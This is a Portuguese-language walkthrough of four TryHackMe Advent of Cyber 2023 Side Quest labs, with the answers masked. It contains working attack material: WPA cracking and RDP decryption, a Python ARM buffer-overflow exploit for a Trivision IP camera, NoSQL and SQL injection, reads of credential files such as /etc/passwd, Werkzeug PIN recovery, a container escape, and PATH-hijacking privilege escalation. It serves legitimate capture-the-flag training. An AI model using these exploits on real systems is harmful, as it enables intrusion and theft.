# Guia de resolução: Advent of Cyber 2023 Side Quest

Este guia acompanha as quatro salas avançadas da [Side Quest de 2023](https://tryhackme.com/room/adventofcyber23sidequest). A sala principal já fornece os links diretos para cada desafio. As respostas aparecem apenas como máscaras; obtenha os valores nos arquivos e laboratórios da sua própria sessão.

Para as tarefas que exigem uma máquina de ataque, use uma máquina Linux própria conectada à VPN ou a AttackBox do TryHackMe. Recomendamos a máquina própria para conservar histórico, arquivos e ferramentas entre sessões; veja as [opções de conexão](../../../README.md#máquina-local-conectada-à-vpn). Para tarefas com arquivos baixados ou VM gráfica do laboratório, use o ambiente indicado pela própria sala.

## SQ1 - The Return of the Yeti

Abra [The Return of the Yeti](https://tryhackme.com/room/adv3nt0fdbopsjcap) e baixe `VanSpy.pcapng.zip` em **Download Task Files**. Extraia a captura no Kali e identifique o SSID nos quadros de beacon. O campo `wlan.ssid` pode sair em hexadecimal, então converta-o para texto antes de responder.

```bash
unzip VanSpy-*.pcapng.zip
tshark -r VanSpy.pcapng -Y 'wlan.ssid' -T fields -e wlan.ssid | sort -u
printf '%s' '<SSID_EM_HEX>' | xxd -r -p
```

O PCAP inclui o handshake WPA. Converta a captura para o formato reconhecido pelo `aircrack-ng` e teste a lista de senhas disponível no Kali:

```bash
editcap -F libpcap VanSpy.pcapng VanSpy.pcap
gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
aircrack-ng -w rockyou.txt -e '<SSID>' VanSpy.pcap
```

Use a senha descoberta para decifrar os quadros Wi-Fi. Liste as conversas TCP e concentre-se na porta `4444`, que contém comandos PowerShell em texto aberto. O fluxo mostra a ferramenta usada para exportar o certificado RDP e, depois, uma longa cadeia em Base64 com o arquivo `.pfx`.

```bash
tshark -r VanSpy.pcapng \
  -o wlan.enable_decryption:TRUE \
  -o 'uat:80211_keys:"wpa-pwd","<SENHA>:<SSID>"' \
  -q -z conv,tcp

tshark -r VanSpy.pcapng \
  -o wlan.enable_decryption:TRUE \
  -o 'uat:80211_keys:"wpa-pwd","<SENHA>:<SSID>"' \
  -q -z follow,tcp,ascii,<NUMERO_DO_FLUXO>
```

Decodifique a cadeia Base64 do certificado em `rdp.pfx`. O utilitário que o exportou usa seu próprio nome como senha padrão do PKCS#12. Extraia a chave privada e carregue-a na lista de chaves RSA do Wireshark/TShark. O comando abaixo permite confirmar que o tráfego TLS passou a ser reconhecido como RDP e que o canal de área de transferência `rdp_cliprdr` aparece na hierarquia de protocolos.

```bash
base64 -d certificado.b64 > rdp.pfx
openssl pkcs12 -legacy -in rdp.pfx -nocerts -nodes -out rdp.pem

tshark -r VanSpy.pcapng \
  -o wlan.enable_decryption:TRUE \
  -o 'uat:80211_keys:"wpa-pwd","<SENHA>:<SSID>"' \
  -o 'uat:rsa_keys:"rdp.pem",""' \
  -q -z io,phs
```

Para recuperar o número do caso e o conteúdo de `yetikey1.txt`, filtre as mensagens **Format data response** do canal `rdp_cliprdr`. O payload do RDP contém texto em UTF-16LE. Exporte os bytes decifrados em **Follow Stream** ou no dump hexadecimal do TShark, decodifique-os como UTF-16LE e procure o e-mail da CyberPolice e a cópia do arquivo no clipboard. A operação com `rdp_cliprdr.ordertype == 5` restringe o tráfego às respostas que carregam esse conteúdo.

```bash
tshark -r VanSpy.pcapng \
  -o wlan.enable_decryption:TRUE \
  -o 'uat:80211_keys:"wpa-pwd","<SENHA>:<SSID>"' \
  -o 'uat:rsa_keys:"rdp.pem",""' \
  -Y 'rdp_cliprdr.ordertype == 5' -x
```

Envie as cinco respostas na sala do desafio. Copie o conteúdo de `yetikey1.txt` para o campo **Side Quest Challenge 1 Flag** da sala principal.

**Resposta:** `Fre...` (SSID).

**Resposta:** `Chr...` (senha WPA).

**Resposta:** `mim...` (ferramenta).

**Resposta:** `313...` (número do caso).

**Resposta:** `1-1...` (conteúdo de `yetikey1.txt`, 66 caracteres).

## SQ2 - Snowy ARMageddon

Inicie a VM de [Snowy ARMageddon](https://tryhackme.com/room/armageddon2r) e aguarde os três ou quatro minutos de boot indicados na sala. Faça uma enumeração direcionada: a porta 50628 pertence à câmera IP Trivision NC-227WF; a 8080 hospeda o aplicativo da CyberPolice e restringe conexões externas; a 23 aceita conexões Telnet, mas fecha a sessão antes da exploração.

```bash
nmap -sT -sV -p 22,23,8080,50628 <IP>
curl -i 'http://<IP>:50628/en/login.asp'
curl -i 'http://<IP>:8080/'
```

A rota `/form/liveRedirect` da câmera não limita adequadamente o parâmetro `lang`. Uma carga de 284 bytes seguida de endereços ARM em little-endian direciona a execução para `system()` e inicia `telnetd` na porta 23. A sequência abaixo monta essa requisição para a câmera do laboratório; substitua o IP e execute no Kali.

```python
import socket
import struct

alvo = '<IP>'
p32 = lambda valor: struct.pack('<I', valor)
carga = b'A' * 284
carga += p32(0x40060b58) + b'BBBBCCCC'
carga += p32(0x4006079c) + p32(0x40021000 + 0x33a98)
carga += b'telnetd${IFS}-l/bin/sh;#'
carga += b'C' * (400 - len(carga))
pedido = (b'GET /form/liveRedirect?lang=' + carga +
          b' HTTP/1.0\nHost: camera\n User-Agent: ARM/exploitlab\n\n')
with socket.create_connection((alvo, 50628), timeout=10) as conexao:
    conexao.sendall(pedido)
```

Conecte-se por Telnet e confirme o shell da câmera. O arquivo `/etc/webs/umconfig.txt` contém o usuário e a senha do portal. Autentique-se em `/en/login.asp` e abra `/en/player/mjpeg_vga.asp`; a primeira flag está na imagem transmitida.

```bash
telnet <IP> 23
id
cat /etc/webs/umconfig.txt
```

O aplicativo da porta 8080 responde a partir da rede interna da câmera. Para usar um navegador e testar as requisições com mais facilidade, transfira para a câmera um binário estático do `socat` compatível com ARM e encaminhe uma porta externa livre até `127.0.0.1:8080`. Caso reutilize 50628, encerre primeiro o processo Web da câmera. No Kali, use a porta encaminhada e as credenciais extraídas de `umconfig.txt` para passar pela autenticação HTTP Basic.

```bash
# Na câmera, após transferir o binário ARM do socat:
./socat-armel-static TCP-LISTEN:50628,fork,reuseaddr TCP:127.0.0.1:8080

# No Kali:
curl -i -u 'admin:<SENHA_DA_CAMERA>' 'http://<IP>:50628/login.php/'
```

O formulário PHP aceita parâmetros de consulta MongoDB. Teste uma expressão regular no nome de usuário e na senha para reconhecer a resposta de autenticação. A conta de `Frosteau` possui o painel que lista `yetikey2.txt`. Guarde o cookie da sessão e siga o redirecionamento após o POST.

```bash
curl -i -L -c cookies.txt -b cookies.txt \
  -u 'admin:<SENHA_DA_CAMERA>' \
  --data-urlencode 'username[$regex]=^Frosteau$' \
  --data-urlencode 'password[$regex]=.*' \
  'http://<IP>:50628/login.php/'

curl -b cookies.txt -u 'admin:<SENHA_DA_CAMERA>' \
  'http://<IP>:50628/index.php/'
```

Envie o conteúdo de `yetikey2.txt` também à sala principal da Side Quest.

**Resposta:** `THM{...}` (flag da câmera).

**Resposta:** `2-K...` (chave final).

## SQ3 - Frosteau Busy with Vim

Inicie a VM de [Frosteau Busy with Vim](https://tryhackme.com/room/busyvimfrosteau) e aguarde cerca de dois minutos. Descubra os serviços expostos a partir do Kali conectado à VPN. Substitua `<IP>` pelo endereço mostrado na sala.

```bash
nmap -sV -p 22,80,8065,8075,8085,8095 <IP>
curl --ftp-port - 'ftp://anonymous:@<IP>:8075/'
```

O FTP permite acesso anônimo. O servidor anuncia um endereço interno para o modo passivo; `--ftp-port -` força o modo ativo. Leia `flag-1-of-4.txt` e `flag-2-of-4.sh`. O segundo arquivo é um script que imprime a variável de ambiente `FLAG2` no terminal do alvo.

```bash
curl --ftp-port - 'ftp://anonymous:@<IP>:8075/flag-1-of-4.txt'
curl --ftp-port - 'ftp://anonymous:@<IP>:8075/flag-2-of-4.sh'
telnet <IP> 8085
```

A porta 8085 abre o Vim. No modo de comando, execute `:echo $FLAG2` para ver a segunda flag. Para obter um shell, faça o download de uma versão estática do BusyBox para x86-64 na sua máquina e envie-a ao FTP. Em distribuições Debian e Kali, é possível extrair o binário do pacote sem instalá-lo:

```bash
apt-get download busybox-static
dpkg-deb -x busybox-static_*.deb busybox-extraido
file busybox-extraido/usr/bin/busybox
curl --ftp-port - -T busybox-extraido/usr/bin/busybox \
  'ftp://anonymous:@<IP>:8075/busybox'
```

Ainda no Vim, ative o modo binário antes de abrir o arquivo enviado. Copie-o para o executável que o serviço Telnet da porta 8065 usará como shell. A sessão do Vim tem permissão de escrita nesse destino.

```vim
:set binary
:e! /tmp/ftp/busybox
:w! /usr/frosty/sh
:set shell=/usr/frosty/sh
:shell
```

O shell aberto pelo Vim roda como `ubuntu`. Confira o processo do Telnet em 8065 e conecte-se a ele em outro terminal: o serviço inicia `/usr/frosty/sh` como `root`. Leia a terceira flag em `/root`.

```bash
id
ps aux | grep 8065
telnet <IP> 8065
id
cat /root/flag-3-of-4.txt
```

Esse `root` ainda está em um contêiner. Verifique o dispositivo `/dev/root`, monte o sistema de arquivos da VM e leia os arquivos da raiz do host. O quarto arquivo de flag e `yetikey3.txt` ficam em `/root` desse volume. Envie a chave à sala principal da Side Quest.

```bash
mkdir -p /mnt/host
mount /dev/root /mnt/host
ls -l /mnt/host/root
cat /mnt/host/root/flag-4-of-4.txt
cat /mnt/host/root/yetikey3.txt
```

**Resposta:** `THM{...}` (flag 1).

**Resposta:** `THM{...}` (flag 2).

**Resposta:** `THM{...}` (flag 3).

**Resposta:** `THM{...}` (flag 4).

**Resposta:** `3-d...` (chave final, 66 caracteres).

## SQ4 - The Bandit Surfer

Inicie a VM de [The Bandit Surfer](https://tryhackme.com/room/surfingyetiiscomingtotown) e identifique a aplicação Flask na porta 8000. Os links da página inicial usam `/download?id=<ID>` para obter imagens. Um ID inexistente mostra um erro do depurador Werkzeug e revela o caminho da instalação do Flask.

```bash
nmap -sV -p 22,8000 <IP>
curl -i 'http://<IP>:8000/download?id=999'
```

O parâmetro `id` é interpolado em uma consulta SQL. A aplicação usa o endereço retornado como URL do PycURL; uma consulta `UNION SELECT` com `file://` transforma isso em leitura de arquivos. Confirme com `/etc/passwd` e leia a flag de usuário no diretório pessoal de `mcskidy`.

```bash
curl -G --data-urlencode "id=8' UNION SELECT 'file:///etc/passwd' -- -" \
  'http://<IP>:8000/download'
curl -G --data-urlencode "id=8' UNION SELECT 'file:///home/mcskidy/user.txt' -- -" \
  'http://<IP>:8000/download'
```

Para abrir `/console`, recupere os dados usados pelo Werkzeug para formar o PIN: usuário em `/proc/self/environ`, caminho de `flask/app.py` no traceback, MAC da interface em `/sys/class/net/<INTERFACE>/address`, `/etc/machine-id` e a primeira linha de `/proc/self/cgroup`. A interface pode ser descoberta em `/proc/self/net/dev`. Converta o MAC hexadecimal para inteiro decimal e reproduza a função `get_pin_and_cookie_name` da versão do Werkzeug instalada no alvo. Como a interface e o PIN podem mudar ao reiniciar a VM, refaça essa coleta em cada instância.

```bash
curl -G --data-urlencode "id=8' UNION SELECT 'file:///proc/self/environ' -- -" \
  'http://<IP>:8000/download'
curl -G --data-urlencode "id=8' UNION SELECT 'file:///proc/self/net/dev' -- -" \
  'http://<IP>:8000/download'
curl -G --data-urlencode "id=8' UNION SELECT 'file:///sys/class/net/<INTERFACE>/address' -- -" \
  'http://<IP>:8000/download'
curl -G --data-urlencode "id=8' UNION SELECT 'file:///etc/machine-id' -- -" \
  'http://<IP>:8000/download'
curl -G --data-urlencode "id=8' UNION SELECT 'file:///proc/self/cgroup' -- -" \
  'http://<IP>:8000/download'
```

Na console desbloqueada, uma expressão Python pode ler arquivos ou iniciar uma conexão de retorno ao seu Kali. O diretório `/home/mcskidy/app` contém um repositório Git. Compare as versões antigas de `app.py`: uma senha anterior do banco foi reutilizada para a conta `mcskidy`. Também é possível reconstruir o histórico de objetos Git com a mesma leitura de arquivos usada acima. O script original [ler_historico_git_sq4.py](scripts/ler_historico_git_sq4.py) automatiza essa última opção e aceita a URL da aplicação como argumento.

```bash
cd /home/mcskidy/app
git log --oneline --all
git show <COMMIT_ANTIGO>:app.py | grep MYSQL_PASSWORD
sudo -l
cat /opt/check.sh
head -n 12 /opt/.bashrc
```

O `sudo -l` permite executar `/usr/bin/bash /opt/check.sh` como `root`, com `/home/mcskidy` no começo do `secure_path`. O arquivo `/opt/.bashrc` desabilita o comando embutido `[`; quando `check.sh` avalia uma condição, o Bash procura um executável com esse nome no `PATH`. Crie esse executável no diretório pessoal, torne-o executável e rode o comando permitido pelo `sudo`. Use a senha encontrada no histórico quando solicitada.

```bash
printf '#!/bin/sh\ncat /root/root.txt\ncat /root/yetikey4.txt\n' > '/home/mcskidy/['
chmod +x '/home/mcskidy/['
sudo /usr/bin/bash /opt/check.sh
```

Envie a chave de `yetikey4.txt` também à sala principal de 2023.

**Resposta:** `THM{...}` (flag de usuário).

**Resposta:** `THM{...}` (flag de `root`).

**Resposta:** `4-3...` (chave final).
